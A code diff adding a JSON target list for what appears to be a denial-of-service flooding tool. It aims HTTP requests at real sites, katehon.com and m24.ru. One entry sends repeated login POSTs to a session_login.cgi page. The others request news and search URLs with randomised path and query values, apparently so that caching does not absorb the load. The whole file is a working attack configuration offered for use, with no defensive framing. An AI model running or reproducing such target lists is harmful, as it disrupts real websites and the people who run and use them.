@@ -1,0 +1,30 @@
+{
+  "targets": [
+    {
+      "target": "https://katehon.com:20000",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "user=a.abcdef&pass=1q2w3e4r5t",
+        "headers": "{\"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"https://katehon.com:20000/session_login.cgi\"}",
+        "path_qs": "/session_login.cgi",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "https://www.m24.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://www.m24.ru/\"}",
+        "path_qs": "/news/politika/08022023/{{int(1,548844)}}?{{str(4)}}={{str(4)}}"
+      }
+    },
+    {
+      "target": "https://www.m24.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://www.m24.ru/\"}",
+        "path_qs": "/sphinx?criteria={{str(1)}}%20{{str(1)}}%20{{str(1)}}&mt="
+      }
+    }
+  ]
+}
